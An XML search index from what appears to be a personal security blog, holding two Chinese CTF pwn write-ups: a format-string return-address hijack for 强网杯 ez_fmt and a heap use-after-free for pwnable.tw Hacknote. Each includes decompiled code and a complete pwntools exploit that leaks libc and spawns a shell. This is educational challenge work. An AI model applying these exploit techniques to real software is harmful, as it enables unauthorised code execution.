<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>强网杯ez_fmt复现</title>
      <link href="/posts/ez_fmt.html"/>
      <url>/posts/ez_fmt.html</url>
      
        <content type="html"><![CDATA[<h2 id="ez-fmt"><a href="#ez-fmt" class="headerlink" title="ez_fmt"></a>ez_fmt</h2><p>本来想着用格式化字符串低位爆破，不过看了别的师傅的文章，似乎有更为巧妙的思路。<br>先给大家看看题目</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">nt __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">&#123;</span><br><span class="line">  char buf[88]; // [rsp+0h] [rbp-60h] BYREF</span><br><span class="line">  unsigned __int64 v5; // [rsp+58h] [rbp-8h]</span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(0x28u);</span><br><span class="line">  setvbuf(stdout, 0LL, 2, 0LL);</span><br><span class="line">  setvbuf(stdin, 0LL, 2, 0LL);</span><br><span class="line">  printf(&quot;There is a gift for you %p\n&quot;, buf);</span><br><span class="line">  read(0, buf, 0x30uLL);</span><br><span class="line">  if ( w == 0xFFFF )</span><br><span class="line">  &#123;</span><br><span class="line">    printf(buf);</span><br><span class="line">    w = 0;</span><br><span class="line">  &#125;</span><br><span class="line">  return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>题目逻辑很简单，给了一个栈上的地址，然后有个只能利用一次的格式化字符串漏洞，这里如果想要在泄露libc基址，并同时劫持main的返回地址和w，0x30个字节显然是不够的，所以要另辟蹊径，尝试劫持<strong>子函数的返回地址</strong>，我们知道，在调用一个函数前,要先push rip，push rbp,把当前函数的执行状态和堆栈保留下来，而这里，题目把一个栈上的地址给我们，劫持子函数的返回地址是办得到的，gdb发现printf(buf)的返回地址刚好就在rsp上方，也就是rsp-8的位置，那我们就可以通过格式化字符串修改这个返回地址，从而控制整个程序。</p><h2 id="执行到printf-buf-时的栈"><a href="#执行到printf-buf-时的栈" class="headerlink" title="执行到printf(buf)时的栈"></a>执行到printf(buf)时的栈</h2><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">00:0000│ rsp     0x7fffe5c1e828 —▸ 0x40123e (main+168) ◂— mov dword ptr [rip + 0x2dc8], 0</span><br><span class="line">01:0008│ rdi rsi 0x7fffe5c1e830 ◂— 0x2438256336303225 (&#x27;%206c%8$&#x27;)</span><br><span class="line">02:0010│         0x7fffe5c1e838 ◂— 0x70243931256e6868 (&#x27;hhn%19$p&#x27;)</span><br><span class="line">03:0018│         0x7fffe5c1e840 —▸ 0x7fffe5c1e828 —▸ 0x40123e (main+168) ◂— mov dword ptr [rip + 0x2dc8], 0</span><br><span class="line">04:0020│         0x7fffe5c1e848 —▸ 0x401205 (main+111) ◂— lea rax, [rbp - 0x60]</span><br><span class="line">05:0028│         0x7fffe5c1e850 —▸ 0x7f71461015e0 ◂— endbr64 </span><br><span class="line">06:0030│         0x7fffe5c1e858 —▸ 0x4012bd (<span class="strong">__libc<span class="emphasis">_csu_</span>init+77) ◂— add rbx, 1</span></span><br><span class="line"><span class="strong">07:0038│         0x7fffe5c1e860 —▸ 0x7f71460fc2e8 ◂— 0x0</span></span><br><span class="line"><span class="strong">08:0040│         0x7fffe5c1e868 —▸ 0x401270 (__</span>libc<span class="emphasis">_csu_</span>init) ◂— endbr64 </span><br><span class="line">09:0048│         0x7fffe5c1e870 ◂— 0x0</span><br><span class="line">0a:0050│         0x7fffe5c1e878 —▸ 0x4010b0 (<span class="emphasis">_start) ◂— endbr64 </span></span><br><span class="line"><span class="emphasis">0b:0058│         0x7fffe5c1e880 —▸ 0x7fffe5c1e980 ◂— 0x1</span></span><br><span class="line"><span class="emphasis">0c:0060│         0x7fffe5c1e888 ◂— 0xf4bc6e9f9994b300</span></span><br><span class="line"><span class="emphasis">0d:0068│ rbp     0x7fffe5c1e890 ◂— 0x0</span></span><br><span class="line"><span class="emphasis">0e:0070│         0x7fffe5c1e898 —▸ 0x7f7145f2f083 (<span class="strong">__libc_start_main+243) ◂— mov edi, eax</span></span></span><br></pre></td></tr></table></figure><p>我们可以看到此时push了一个返回地址上去，<del>0x40123e</del>,这就是我们要劫持的返回地址了，当然，劫持一个可能还不够，为了实现rop，我们至少需要写0x18个字节进去，但这里buf有长度限制，仅用格式化字符串显然是不够的。显然需要换一种思路。我们知道,ret相当于pop rip,那也就是说只需要把rsp控制到我们写入的位置就可以了，这里为了避免格式化字符串和我们写入的返回地址冲突，我们用<del>libc_csu_init</del>中的gadget来控制rsp。需要注意的是，在rop之前我们需要先泄露一个libc函数的地址来拿到libc_base。这一步可以放到格式化字符串那一步做。csu的pop执行完后，我们就可以利用ret来继续劫持程序流。<br><strong>所以我们的总体思路就是</strong>:<del>格式化字符串劫持子函数的返回地址到libc_csu_init</del>-&gt;<del>利用其中的pop|ret劫持程序流到read</del>-&gt;<del>利用read写入rop链，同时劫持read函数的返回地址</del></p><h2 id="exp"><a href="#exp" class="headerlink" title="exp:"></a>exp:</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#from LibcSearcher import *</span></span><br><span class="line">p=process(<span class="string">&quot;./ez_fmt&quot;</span>)</span><br><span class="line">libc=ELF(<span class="string">&quot;./libc-2.31.so&quot;</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.recvuntil(<span class="string">b&quot;0x&quot;</span>)</span><br><span class="line">buf_addr=<span class="string">&quot;0x&quot;</span>+p.recvuntil(<span class="string">&quot;\n&quot;</span>)[:-<span class="number">1</span>].decode(<span class="string">&quot;utf-8&quot;</span>)</span><br><span class="line">buf_addr=<span class="built_in">int</span>(buf_addr,<span class="number">16</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(buf_addr))</span><br><span class="line">read_addr=<span class="number">0x401205</span></span><br><span class="line">offset=<span class="number">0x18</span></span><br><span class="line">payload=<span class="string">b&quot;%206c%8$hhn%19$p&quot;</span>+p64(buf_addr-<span class="number">8</span>)+p64(read_addr)</span><br><span class="line">payload.ljust(<span class="number">0x30</span>,<span class="string">b&quot;a&quot;</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">&quot;0x&quot;</span>)</span><br><span class="line">libc_base=<span class="built_in">int</span>(<span class="string">&quot;0x&quot;</span>+p.recv(<span class="number">12</span>).decode(<span class="string">&quot;utf-8&quot;</span>),<span class="number">16</span>)-libc.sym[<span class="string">&quot;__libc_start_main&quot;</span>]-<span class="number">243</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_base))</span><br><span class="line">pop_rdi=<span class="number">0x00000000004012d3</span></span><br><span class="line">system=libc_base+libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">bin_sh=libc_base+<span class="built_in">next</span>(libc.search(<span class="string">b&quot;/bin/sh\x00&quot;</span>))</span><br><span class="line">one=<span class="number">0xe3b04</span></span><br><span class="line">payload=<span class="string">b&quot;a&quot;</span>*<span class="number">0x18</span>+p64(pop_rdi)+p64(bin_sh)+p64(libc_base+<span class="number">0x051CD2</span>)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line"><span class="comment">#payload=b&quot;a&quot;*0x18+p64(one)</span></span><br><span class="line">p.send(payload)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(bin_sh))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p><strong>参考文献</strong>:<a href="https://www.cnblogs.com/S1nyer/p/17914751.html">https://www.cnblogs.com/S1nyer/p/17914751.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> -子函数劫持 -格式化字符串 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HackNote</title>
      <link href="/posts/HackNote.html"/>
      <url>/posts/HackNote.html</url>
      
        <content type="html"><![CDATA[<h2 id="Hacknote"><a href="#Hacknote" class="headerlink" title="Hacknote"></a>Hacknote</h2><p>对于入门堆的师傅来说，这是个不错的入门题，但pwnabletw上扣了符号表，gdb调试起来比较麻烦，建议先做攻防世界上的，我们先看看ida反编译出来的代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">void __cdecl __noreturn main()</span><br><span class="line">&#123;</span><br><span class="line">  int v0; // eax</span><br><span class="line">  char buf[4]; // [esp+8h] [ebp-10h] BYREF</span><br><span class="line">  unsigned int v2; // [esp+Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v2 = __readgsdword(0x14u);</span><br><span class="line">  setvbuf(stdout, 0, 2, 0);</span><br><span class="line">  setvbuf(stdin, 0, 2, 0);</span><br><span class="line">  while ( 1 )</span><br><span class="line">  &#123;</span><br><span class="line">    while ( 1 )</span><br><span class="line">    &#123;</span><br><span class="line">      all_choice();</span><br><span class="line">      read(0, buf, 4u);</span><br><span class="line">      v0 = atoi(buf);                           // get choice</span><br><span class="line">      if ( v0 != 2 )</span><br><span class="line">        break;</span><br><span class="line">      delete();</span><br><span class="line">    &#125;</span><br><span class="line">    if ( v0 &gt; 2 )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( v0 == 3 )</span><br><span class="line">      &#123;</span><br><span class="line">        print_note();</span><br><span class="line">      &#125;</span><br><span class="line">      else</span><br><span class="line">      &#123;</span><br><span class="line">        if ( v0 == 4 )</span><br><span class="line">          exit(0);</span><br><span class="line">LABEL_13:</span><br><span class="line">        puts(&quot;Invalid choice&quot;);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">      if ( v0 != 1 )</span><br><span class="line">        goto LABEL_13;</span><br><span class="line">      add_note();</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>比较经典的形式，这里的重点在三个函数上，我们一起看看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line">unsigned int add_note()</span><br><span class="line">&#123;</span><br><span class="line">  int v0; // ebx</span><br><span class="line">  int i; // [esp+Ch] [ebp-1Ch]</span><br><span class="line">  int size; // [esp+10h] [ebp-18h]</span><br><span class="line">  char buf[8]; // [esp+14h] [ebp-14h] BYREF</span><br><span class="line">  unsigned int v5; // [esp+1Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v5 = __readgsdword(0x14u);</span><br><span class="line">  if ( limit &lt;= 5 )</span><br><span class="line">  &#123;</span><br><span class="line">    for ( i = 0; i &lt;= 4; ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      if ( !*(&amp;ptr + i) )</span><br><span class="line">      &#123;</span><br><span class="line">        *(&amp;ptr + i) = malloc(8u);</span><br><span class="line">        if ( !*(&amp;ptr + i) )</span><br><span class="line">        &#123;</span><br><span class="line">          puts(&quot;Alloca Error&quot;);</span><br><span class="line">          exit(-1);</span><br><span class="line">        &#125;</span><br><span class="line">        *(_DWORD *)*(&amp;ptr + i) = puts_a;</span><br><span class="line">        printf(&quot;Note size :&quot;);</span><br><span class="line">        read(0, buf, 8u);</span><br><span class="line">        size = atoi(buf);</span><br><span class="line">        v0 = (int)*(&amp;ptr + i);</span><br><span class="line">        *(_DWORD *)(v0 + 4) = malloc(size);</span><br><span class="line">        if ( !*((_DWORD *)*(&amp;ptr + i) + 1) )</span><br><span class="line">        &#123;</span><br><span class="line">          puts(&quot;Alloca Error&quot;);</span><br><span class="line">          exit(-1);</span><br><span class="line">        &#125;</span><br><span class="line">        printf(&quot;Content :&quot;);</span><br><span class="line">        read(0, *((void **)*(&amp;ptr + i) + 1), size);</span><br><span class="line">        puts(&quot;Success !&quot;);</span><br><span class="line">        ++limit;</span><br><span class="line">        return __readgsdword(0x14u) ^ v5;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  else</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Full&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return __readgsdword(0x14u) ^ v5;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">####delete</span><br><span class="line">unsigned int delete()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; // [esp+4h] [ebp-14h]</span><br><span class="line">  char buf[4]; // [esp+8h] [ebp-10h] BYREF</span><br><span class="line">  unsigned int v3; // [esp+Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(0x14u);</span><br><span class="line">  printf(&quot;Index :&quot;);</span><br><span class="line">  read(0, buf, 4u);</span><br><span class="line">  v1 = atoi(buf);</span><br><span class="line">  if ( v1 &lt; 0 || v1 &gt;= limit )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Out of bound!&quot;);</span><br><span class="line">    _exit(0);</span><br><span class="line">  &#125;</span><br><span class="line">  if ( *(&amp;ptr + v1) )</span><br><span class="line">  &#123;</span><br><span class="line">    free(*((void **)*(&amp;ptr + v1) + 1));</span><br><span class="line">    free(*(&amp;ptr + v1));</span><br><span class="line">    puts(&quot;Success&quot;);</span><br><span class="line">  &#125;</span><br><span class="line">  return __readgsdword(0x14u) ^ v3;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">####print_note</span><br><span class="line">unsigned int print_note()</span><br><span class="line">&#123;</span><br><span class="line">  int v1; // [esp+4h] [ebp-14h]</span><br><span class="line">  char buf[4]; // [esp+8h] [ebp-10h] BYREF</span><br><span class="line">  unsigned int v3; // [esp+Ch] [ebp-Ch]</span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(0x14u);</span><br><span class="line">  printf(&quot;Index :&quot;);</span><br><span class="line">  read(0, buf, 4u);</span><br><span class="line">  v1 = atoi(buf);</span><br><span class="line">  if ( v1 &lt; 0 || v1 &gt;= limit )</span><br><span class="line">  &#123;</span><br><span class="line">    puts(&quot;Out of bound!&quot;);</span><br><span class="line">    _exit(0);</span><br><span class="line">  &#125;</span><br><span class="line">  if ( *(&amp;ptr + v1) )</span><br><span class="line">    (*(void (__cdecl **)(_DWORD))*(&amp;ptr + v1))(*(&amp;ptr + v1));</span><br><span class="line">  return __readgsdword(0x14u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>仔细看可以发现，delete节点后这里没有把指针置为NULL,也没有对note数量进行减操作，delete后的note仍然可以通过print_note来访问，很明显是存在uaf(Use-after-free)漏洞的。<br>我们继续看add的逻辑，发现这个程序在生成一个content节点之前，会先申请一个chunk存放puts的地址和content chunk的地址。那现在，我们已经有大概的思路了，首先由于index chunk的申请大小小于0x10，所以在free之后它会归fastbin管理，fastbin是个单向链表，遵循先进后出原则（最后一个free的chunk会被优先分配）。那么我们就可以先申请两个大于0x20的note,记为note0,note1。index chunk 记为index0,index1。再将他们delete,由于note大于0x20,所以此时我们的fastbin是:index0-&gt;index1,此时我们再去申请一个小于0xf的chunk(add_note),那么这个note的chunk就会从fastbin中取，这个note我们记为<strong>note3: index : index0, content:index1</strong> 此时我们就可以向index1里面写一些函数的地址 ，然后调用了。 知道原理后 ，这就是一个简单的32位ret2libc。<br/><br>###exp:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(arch=&quot;i386&quot;,os=&quot;linux&quot;)</span><br><span class="line">#p=process(&quot;./hacknote&quot;)</span><br><span class="line">p=remote(&quot;chall.pwnable.tw&quot;,10102)</span><br><span class="line">elf=ELF(&quot;./hacknote&quot;)</span><br><span class="line">def add_note(size,content):</span><br><span class="line">    p.sendafter(&quot;Your choice :&quot;,str(1))</span><br><span class="line">    p.sendafter(&quot;size :&quot;,str(size))</span><br><span class="line">    p.sendafter(&quot;Content :&quot;,content)</span><br><span class="line">def delete_note(index):</span><br><span class="line">    p.sendafter(&quot;Your choice :&quot;,str(2))</span><br><span class="line">    p.sendafter(&quot;Index :&quot;,str(index))</span><br><span class="line">def print_note(index):</span><br><span class="line">    p.sendafter(&quot;Your choice :&quot;,str(3))</span><br><span class="line">    p.sendafter(&quot;Index :&quot;,str(index))</span><br><span class="line">def get_out():</span><br><span class="line">    p.sendafter(&quot;Your choice :&quot;,str(4))</span><br><span class="line">libc=ELF(&quot;./libc_32.so.6&quot;)</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">add_note(size=0x50,content=b&quot;aaaa&quot;) #note 0</span><br><span class="line">add_note(size=0x50,content=b&quot;aaaa&quot;)# note 1</span><br><span class="line">delete_note(1) #delete note 1</span><br><span class="line">delete_note(0) #delete note 0</span><br><span class="line">read_got=elf.got[&quot;read&quot;]</span><br><span class="line">puts=0x804862B</span><br><span class="line">payload=p32(puts)+p32(read_got)</span><br><span class="line">add_note(size=0x8,content=payload)</span><br><span class="line">print_note(1)</span><br><span class="line">read_addr=int.from_bytes(p.recv(4),byteorder=&quot;little&quot;)</span><br><span class="line">libc_base=read_addr-libc.sym[&quot;read&quot;]</span><br><span class="line">print(hex(libc_base))</span><br><span class="line">system=libc.sym[&quot;system&quot;]+libc_base</span><br><span class="line">bin_sh=libc_base+next(libc.search(b&quot;/bin/sh&quot;))</span><br><span class="line">payload=p32(system)+b&quot;;sh\0&quot;</span><br><span class="line">#add_note(size=0x20,content=b&quot;aaaa&quot;)</span><br><span class="line">delete_note(2)</span><br><span class="line">#delete_note(3)</span><br><span class="line">add_note(size=0x8,content=payload)</span><br><span class="line">print_note(1)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>如有错误，欢迎各位师傅指正。</p>]]></content>
      
      
      
    </entry>
    
    
  
  
    
  
</search>
